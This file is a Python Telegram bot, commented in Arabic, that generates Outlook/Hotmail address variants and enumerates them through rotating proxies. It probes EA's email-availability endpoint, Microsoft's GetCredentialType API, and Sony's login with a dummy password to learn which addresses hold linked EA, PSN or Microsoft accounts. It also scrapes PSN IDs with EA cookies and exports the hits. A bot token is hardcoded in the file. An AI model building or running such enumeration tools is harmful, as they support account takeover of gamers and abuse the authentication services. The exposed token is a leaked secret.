import time
import json
import urllib.request
import urllib.error
import threading
import re
from pathlib import Path

# ============================================
# 🔑 توكن البوت (تم التحديث)
# ============================================
BOT_TOKEN = "8770824530:AAFLhB2FAi-tMqJ_pdBMMGDmLVMzmCQpSCs"

# ============================================
# 📁 الإعدادات
# ============================================
DATA_DIR = Path(__file__).parent / "data"
DATA_DIR.mkdir(exist_ok=True)

user_sessions = {}
running_tasks = {}
user_phase = {}

# ============================================
# 📂 دوال الملفات
# ============================================
def read_file(path):
    p = Path(path)
    if not p.exists():
        return []
    with open(p, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def write_file(path, data):
    with open(path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(data))

def append_file(path, line):
    with open(path, 'a', encoding='utf-8') as f:
        f.write(line + '\n')

def clear_file(path):
    p = Path(path)
    if p.exists():
        p.unlink()

# ============================================
# 🔍 دوال الفحص
# ============================================
def check_ea(email, proxy=None):
    try:
        url = f'https://signin.ea.com/p/ajax/user/checkEmailAvailability?email={email}'
        req = urllib.request.Request(url, method='GET')
        req.add_header('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)')
        if proxy:
            h = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            opener = urllib.request.build_opener(h)
            urllib.request.install_opener(opener)
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
            if data.get('available') == True:
                return 'not-linked', None
            cookies = r.headers.get('Set-Cookie', '')
            psn_id = get_psn_id_from_ea(cookies, proxy)
            return 'linked', psn_id
    except:
        return 'error', None

def check_ms(email, proxy=None):
    try:
        url = 'https://login.microsoftonline.com/common/GetCredentialType'
        data = json.dumps({"username": email, "isOtherIdpSupported": True}).encode()
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        if proxy:
            h = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            opener = urllib.request.build_opener(h)
            urllib.request.install_opener(opener)
        with urllib.request.urlopen(req, timeout=6) as r:
            result = json.loads(r.read().decode())
            if result.get('IfExistsResult') == 1:
                return 'available'
            elif result.get('IfExistsResult') in [0, 4, 5, 6]:
                return 'not-available'
            return 'error'
    except:
        return 'error'

def check_psn_direct(email, proxy=None):
    try:
        url = 'https://ca.account.sony.com/api/v1/ssocookie'
        data = json.dumps({
            "authentication_type": "password",
            "username": email,
            "password": "Probe__X9$!!"
        }).encode()
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        if proxy:
            h = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            opener = urllib.request.build_opener(h)
            urllib.request.install_opener(opener)
        with urllib.request.urlopen(req, timeout=6) as r:
            result = json.loads(r.read().decode())
            code = result.get('error_code', '')
            if code in ['4165', '4145', '4100', '4155']:
                return 'linked'
            elif code in ['4168', '4150', '4160']:
                return 'not-linked'
            return 'error'
    except:
        return 'error'

def get_psn_id_from_ea(cookies, proxy=None):
    try:
        url = 'https://profile.ea.com/account/connected-accounts'
        req = urllib.request.Request(url, method='GET')
        req.add_header('Cookie', cookies)
        req.add_header('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)')
        if proxy:
            h = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            opener = urllib.request.build_opener(h)
            urllib.request.install_opener(opener)
        with urllib.request.urlopen(req, timeout=5) as r:
            html = r.read().decode()
            m = re.search(r'Playstation["\']?Network.*?([A-Za-z0-9_\-]+)', html, re.DOTALL | re.IGNORECASE)
            if m:
                return m.group(1)
            return None
    except:
        return None

# ============================================
# 🚀 مولد الإيميلات
# ============================================
def generate_emails(first, second=''):
    domains = ['@hotmail.com', '@outlook.com', '@live.com', '@msn.com']
    results = set()
    seps = ['', '-', '.', '_']
    years = list(range(1970, 2031))
    nums = list(range(0, 1000))
    extras = ['PLAY', 'PLAYSTATION', 'PS3', 'PSN', 'GAMER', 'PRO', 'KING']
    
    words = [first]
    if second:
        words.append(second)
    
    for w in words:
        results.add(w)
        for s in seps:
            if s:
                results.add(w + s + w)
            for n in nums:
                results.add(w + s + str(n) if s else w + str(n))
            for y in years:
                results.add(w + s + str(y) if s else w + str(y))
    
    if second:
        results.add(first + second)
        results.add(second + first)
        for s in seps:
            if s:
                results.add(first + s + second)
                results.add(second + s + first)
                for n in nums:
                    results.add(first + s + second + s + str(n))
                    results.add(second + s + first + s + str(n))
                for y in years:
                    results.add(first + s + second + s + str(y))
                    results.add(second + s + first + s + str(y))
            else:
                for n in nums:
                    results.add(first + second + str(n))
                    results.add(second + first + str(n))
                for y in years:
                    results.add(first + second + str(y))
                    results.add(second + first + str(y))
        
        for ex in extras:
            for s in seps:
                if s:
                    results.add(first + s + ex)
                    results.add(second + s + ex)
                    results.add(first + s + second + s + ex)
                else:
                    results.add(first + ex)
                    results.add(second + ex)
                    results.add(first + second + ex)
        
        for s1 in ['-', '.', '_']:
            for s2 in ['-', '.', '_']:
                results.add(first + s1 + second + s2 + '0')
                results.add(first + s1 + second + s2 + '100')
                results.add(first + s1 + second + s2 + '123')
                results.add(first + s1 + second + s2 + '2026')
                for n in nums[:100]:
                    results.add(first + s1 + second + s2 + str(n))
    
    final = []
    for email in results:
        for d in domains:
            final.append(email + d)
    return list(set(final))

# ============================================
# 🌐 دوال التلغرام
# ============================================
def send_message(chat_id, text, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = f"chat_id={chat_id}&text={text}&parse_mode=Markdown"
        if keyboard:
            data += f"&reply_markup={json.dumps(keyboard)}"
        req = urllib.request.Request(url, data=data.encode(), method='POST')
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"❌ إرسال: {e}")

def send_file(chat_id, file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        with open(file_path, 'rb') as f:
            file_data = f.read()
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="{Path(file_path).name}"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
        ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        print(f"❌ ملف: {e}")

def get_updates(offset=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?timeout=25"
        if offset:
            url += f"&offset={offset}"
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, timeout=28) as r:
            return json.loads(r.read().decode()).get('result', [])
    except Exception as e:
        print(f"❌ تحديثات: {e}")
        return []

# ============================================
# 🎛️ أزرار
# ============================================
def phase_keyboard():
    return {"inline_keyboard": [
        [{"text": "🔍 EA فقط", "callback_data": "phase_ea"}],
        [{"text": "📤 Microsoft فقط", "callback_data": "phase_ms"}],
        [{"text": "🔁 EA + Microsoft", "callback_data": "phase_both"}],
        [{"text": "🎮 الكل (+ PSN)", "callback_data": "phase_all"}]
    ]}

def proxy_keyboard():
    return {"inline_keyboard": [
        [{"text": "📋 قائمة", "callback_data": "proxy_list"}],
        [{"text": "➕ إضافة", "callback_data": "proxy_add"}],
        [{"text": "✅ اختبار", "callback_data": "proxy_test"}],
        [{"text": "🗑 مسح", "callback_data": "proxy_clear"}]
    ]}

# ============================================
# ⚙️ تنفيذ الفحوصات
# ============================================
def run_ea_check(chat_id, emails, proxies):
    clear_file(DATA_DIR / 'Linked.txt')
    clear_file(DATA_DIR / 'NotLinked.txt')
    clear_file(DATA_DIR / 'PSN_Linked.txt')
    
    send_message(chat_id, f"▶️ **فحص EA** لـ {len(emails)} إيميل...")
    linked, not_linked = [], []
    total = len(emails)
    
    for i, email in enumerate(emails):
        if not running_tasks.get(chat_id, True):
            send_message(chat_id, "⏹️ تم الإيقاف")
            break
        proxy = proxies[i % len(proxies)] if proxies else None
        status, psn_id = check_ea(email, proxy)
        if status == 'linked':
            linked.append(email)
            append_file(DATA_DIR / 'Linked.txt', email)
            if psn_id:
                append_file(DATA_DIR / 'PSN_Linked.txt', f"{email} | PSN: {psn_id}")
        elif status == 'not-linked':
            not_linked.append(email)
            append_file(DATA_DIR / 'NotLinked.txt', email)
        if (i+1) % 20 == 0 or (i+1) == total:
            send_message(chat_id, f"📊 {i+1}/{total}\n🔗 {len(linked)}\n❌ {len(not_linked)}")
    
    send_message(chat_id, f"✅ **انتهى EA**\n🔗 {len(linked)}\n❌ {len(not_linked)}")
    if linked:
        send_file(chat_id, DATA_DIR / 'Linked.txt', "🔗 المرتبطة بـ EA")
        if (DATA_DIR / 'PSN_Linked.txt').exists() and (DATA_DIR / 'PSN_Linked.txt').stat().st_size > 0:
            send_file(chat_id, DATA_DIR / 'PSN_Linked.txt', "🎮 PSN ID")
    
    phase = user_phase.get(chat_id, 'both')
    if not_linked and phase in ['both', 'all']:
        run_ms_check(chat_id, not_linked, proxies)
    else:
        running_tasks[chat_id] = False

def run_ms_check(chat_id, emails, proxies):
    clear_file(DATA_DIR / 'Available.txt')
    clear_file(DATA_DIR / 'NotAvailable.txt')
    clear_file(DATA_DIR / 'Errors.txt')
    
    send_message(chat_id, f"▶️ **فحص MS** لـ {len(emails)} إيميل...")
    available, not_available, errors = [], [], []
    total = len(emails)
    
    for i, email in enumerate(emails):
        if not running_tasks.get(chat_id, True):
            send_message(chat_id, "⏹️ تم الإيقاف")
            break
        proxy = proxies[i % len(proxies)] if proxies else None
        result = check_ms(email, proxy)
        if result == 'available':
            available.append(email)
            append_file(DATA_DIR / 'Available.txt', email)
        elif result == 'not-available':
            not_available.append(email)
            append_file(DATA_DIR / 'NotAvailable.txt', email)
        else:
            errors.append(email)
            append_file(DATA_DIR / 'Errors.txt', email)
        if (i+1) % 20 == 0 or (i+1) == total:
            send_message(chat_id, f"📊 MS {i+1}/{total}\n📤 {len(available)}\n📥 {len(not_available)}\n⚠️ {len(errors)}")
    
    send_message(chat_id, f"✅ **انتهى MS**\n📤 {len(available)}\n📥 {len(not_available)}\n⚠️ {len(errors)}")
    if available:
        send_file(chat_id, DATA_DIR / 'Available.txt', "📤 المتاحة")
    running_tasks[chat_id] = False

def run_psn_check(chat_id, emails, proxies):
    clear_file(DATA_DIR / 'PSN_Linked.txt')
    clear_file(DATA_DIR / 'PSN_NotLinked.txt')
    clear_file(DATA_DIR / 'PSN_Errors.txt')
    
    send_message(chat_id, f"▶️ **فحص PSN** لـ {len(emails)} إيميل...")
    linked, not_linked, errors = [], [], []
    total = len(emails)
    
    for i, email in enumerate(emails):
        if not running_tasks.get(chat_id, True):
            send_message(chat_id, "⏹️ تم الإيقاف")
            break
        proxy = proxies[i % len(proxies)] if proxies else None
        result = check_psn_direct(email, proxy)
        if result == 'linked':
            linked.append(email)
            append_file(DATA_DIR / 'PSN_Linked.txt', email)
        elif result == 'not-linked':
            not_linked.append(email)
            append_file(DATA_DIR / 'PSN_NotLinked.txt', email)
        else:
            errors.append(email)
            append_file(DATA_DIR / 'PSN_Errors.txt', email)
        if (i+1) % 20 == 0 or (i+1) == total:
            send_message(chat_id, f"📊 PSN {i+1}/{total}\n🎮 {len(linked)}\n❌ {len(not_linked)}\n⚠️ {len(errors)}")
    
    send_message(chat_id, f"✅ **انتهى PSN**\n🎮 {len(linked)}\n❌ {len(not_linked)}\n⚠️ {len(errors)}")
    if linked:
        send_file(chat_id, DATA_DIR / 'PSN_Linked.txt', "🎮 المرتبطة بـ PSN")
    running_tasks[chat_id] = False

# ============================================
# 🧠 معالج الأوامر
# ============================================
def process_command(chat_id, text):
    global user_sessions
    
    if chat_id in user_sessions:
        s = user_sessions[chat_id]
        if s.get('step') == 'awaiting_first':
            s['first'] = text.strip()
            s['step'] = 'awaiting_second'
            send_message(chat_id, "📝 الكلمة الثانية (أو /skip):")
            return
        elif s.get('step') == 'awaiting_second':
            if text == '/skip':
                s['second'] = ''
            else:
                s['second'] = text.strip()
            first = s['first']
            second = s['second']
            emails = generate_emails(first, second)
            write_file(DATA_DIR / 'emails.txt', emails)
            send_message(chat_id, f"✅ توليد {len(emails)} إيميل")
            sample = "\n".join(emails[:10])
            send_message(chat_id, f"📋 عينة:\n```\n{sample}\n```")
            del user_sessions[chat_id]
            return
    
    if text == "/start" or text == "/menu":
        send_message(chat_id, """
🤖 **EA + Outlook + PSN v5.0** ⚡

📌 **الأوامر:**
/generate  🚀 توليد
/check     🔍 فحص
/add_proxy 🌐 بروكسيات
/status    📊 حالة
/stop      ⏹️ إيقاف
/export    📁 تصدير
/help      ❓ مساعدة
        """)
        return
    
    if text == "/help":
        send_message(chat_id, "/generate - توليد\n/check - فحص\n/add_proxy - بروكسيات\n/status - حالة\n/stop - إيقاف\n/export - تصدير")
        return
    
    if text == "/status":
        emails = len(read_file(DATA_DIR / 'emails.txt'))
        proxies = len(read_file(DATA_DIR / 'proxies.txt'))
        linked = len(read_file(DATA_DIR / 'Linked.txt'))
        available = len(read_file(DATA_DIR / 'Available.txt'))
        psn = len(read_file(DATA_DIR / 'PSN_Linked.txt'))
        send_message(chat_id, f"📊 **الحالة:**\n📧 إيميلات: {emails}\n🌐 بروكسيات: {proxies}\n🔗 EA: {linked}\n📤 MS: {available}\n🎮 PSN: {psn}")
        return
    
    if text == "/add_proxy":
        send_message(chat_id, "🌐 **مدير البروكسيات**", proxy_keyboard())
        return
    
    if text == "/check":
        emails = read_file(DATA_DIR / 'emails.txt')
        if not emails:
            send_message(chat_id, "❌ لا توجد إيميلات! استخدم `/generate`")
            return
        proxies = read_file(DATA_DIR / 'proxies.txt')
        if not proxies:
            send_message(chat_id, "⚠️ لا توجد بروكسيات! استخدم `/add_proxy`")
            return
        send_message(chat_id, f"📧 {len(emails)} إيميل | 🌐 {len(proxies)} بروكسي\n🔍 **اختر:**", phase_keyboard())
        return
    
    if text == "/generate":
        user_sessions[chat_id] = {'step': 'awaiting_first'}
        send_message(chat_id, "📝 أرسل الكلمة الأولى (مثل: `king`):")
        return
    
    if text == "/stop":
        if running_tasks.get(chat_id, False):
            running_tasks[chat_id] = False
            send_message(chat_id, "⏹️ تم الإيقاف")
        else:
            send_message(chat_id, "ℹ️ لا يوجد فحص")
        return
    
    if text == "/export":
        files = ['Linked.txt', 'NotLinked.txt', 'Available.txt', 'NotAvailable.txt', 'Errors.txt', 'PSN_Linked.txt', 'PSN_NotLinked.txt', 'PSN_Errors.txt']
        sent = 0
        for f in files:
            p = DATA_DIR / f
            if p.exists() and p.stat().st_size > 0:
                send_file(chat_id, p, f"📄 {f}")
                sent += 1
        if sent == 0:
            send_message(chat_id, "❌ لا توجد نتائج")
        else:
            send_message(chat_id, f"✅ تم إرسال {sent} ملف")
        return

def process_callback(chat_id, data):
    global user_phase, running_tasks
    
    if data.startswith("phase_"):
        phase = data.replace("phase_", "")
        user_phase[chat_id] = phase
        names = {"ea": "🔍 EA", "ms": "📤 MS", "both": "🔁 EA+MS", "all": "🎮 الكل+PSN"}
        send_message(chat_id, f"✅ تم اختيار: **{names.get(phase, phase)}**")
        
        emails = read_file(DATA_DIR / 'emails.txt')
        proxies = read_file(DATA_DIR / 'proxies.txt')
        if not emails or not proxies:
            return
        
        if running_tasks.get(chat_id, False):
            send_message(chat_id, "⏳ فحص قيد التشغيل...")
            return
        
        running_tasks[chat_id] = True
        if phase == "ea":
            threading.Thread(target=run_ea_check, args=(chat_id, emails, proxies), daemon=True).start()
        elif phase == "ms":
            threading.Thread(target=run_ms_check, args=(chat_id, emails, proxies), daemon=True).start()
        elif phase in ["both", "all"]:
            threading.Thread(target=run_ea_check, args=(chat_id, emails, proxies), daemon=True).start()
        return
    
    if data == "proxy_list":
        proxies = read_file(DATA_DIR / 'proxies.txt')
        msg = "📋 البروكسيات:\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies)]) if proxies else "❌ لا توجد"
        send_message(chat_id, msg, proxy_keyboard())
        return
    
    if data == "proxy_add":
        user_sessions[chat_id] = {'step': 'awaiting_proxy'}
        send_message(chat_id, "📤 أرسل البروكسيات (نصاً أو ملفاً)")
        return
    
    if data == "proxy_test":
        proxies = read_file(DATA_DIR / 'proxies.txt')
        if not proxies:
            send_message(chat_id, "❌ لا توجد بروكسيات")
            return
        send_message(chat_id, f"🧪 اختبار {len(proxies)} بروكسي...")
        valid = 0
        for p in proxies:
            try:
                h = urllib.request.ProxyHandler({'http': p, 'https': p})
                opener = urllib.request.build_opener(h)
                urllib.request.install_opener(opener)
                req = urllib.request.Request('https://api.ipify.org', method='GET')
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status == 200:
                        valid += 1
            except:
                pass
        send_message(chat_id, f"✅ {valid}/{len(proxies)} صالح", proxy_keyboard())
        return
    
    if data == "proxy_clear":
        write_file(DATA_DIR / 'proxies.txt', [])
        send_message(chat_id, "🗑 تم المسح", proxy_keyboard())
        return

# ============================================
# 🏃 تشغيل البوت
# ============================================
def run():
    print("⚡ البوت يعمل...")
    print(f"📁 البيانات: {DATA_DIR}")
    last_id = 0
    
    while True:
        try:
            updates = get_updates(last_id + 1)
            for u in updates:
                if u['update_id'] > last_id:
                    last_id = u['update_id']
                
                if 'message' in u:
                    msg = u['message']
                    chat_id = msg['chat']['id']
                    
                    if 'document' in msg:
                        try:
                            file_id = msg['document']['file_id']
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
                            req = urllib.request.Request(url, method='GET')
                            with urllib.request.urlopen(req, timeout=10) as r:
                                info = json.loads(r.read().decode())
                                fpath = info['result']['file_path']
                                dl_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fpath}"
                                req2 = urllib.request.Request(dl_url, method='GET')
                                with urllib.request.urlopen(req2, timeout=15) as r2:
                                    content = r2.read().decode('utf-8', errors='ignore')
                                    proxies = [p.strip() for p in content.split('\n') if p.strip()]
                                    write_file(DATA_DIR / 'proxies.txt', proxies)
                                    send_message(chat_id, f"🌐 تم استلام {len(proxies)} بروكسي")
                        except:
                            send_message(chat_id, "❌ فشل قراءة الملف")
                        continue
                    
                    text = msg.get('text', '')
                    if chat_id and text:
                        if text.startswith('/'):
                            process_command(chat_id, text)
                        elif text.startswith('http') or text.startswith('socks'):
                            proxies = [p.strip() for p in text.split('\n') if p.strip()]
                            existing = read_file(DATA_DIR / 'proxies.txt')
                            write_file(DATA_DIR / 'proxies.txt', existing + proxies)
                            send_message(chat_id, f"🌐 تم إضافة {len(proxies)} بروكسي")
                        elif '@' in text and len(text.split()) == 1:
                            email = text.strip()
                            send_message(chat_id, f"📧 فحص: `{email}`")
                            proxy = read_file(DATA_DIR / 'proxies.txt')
                            p = proxy[0] if proxy else None
                            status, psn_id = check_ea(email, p)
                            ms = check_ms(email, p)
                            psn = check_psn_direct(email, p)
                            msg = f"📧 **{email}**\n🔗 EA: {status}"
                            if status == 'linked' and psn_id:
                                msg += f"\n🎮 PSN ID: `{psn_id}`"
                            msg += f"\n📤 MS: {ms}"
                            if psn:
                                msg += f"\n🎮 PSN: {psn}"
                            send_message(chat_id, msg)
                
                if 'callback_query' in u:
                    cb = u['callback_query']
                    chat_id = cb['message']['chat']['id']
                    data = cb['data']
                    try:
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery?callback_query_id={cb['id']}"
                        urllib.request.urlopen(url, timeout=5)
                    except:
                        pass
                    process_callback(chat_id, data)
            
            time.sleep(2)
        except Exception as e:
            print(f"❌ {e}")
            time.sleep(5)

if __name__ == '__main__':
    run()
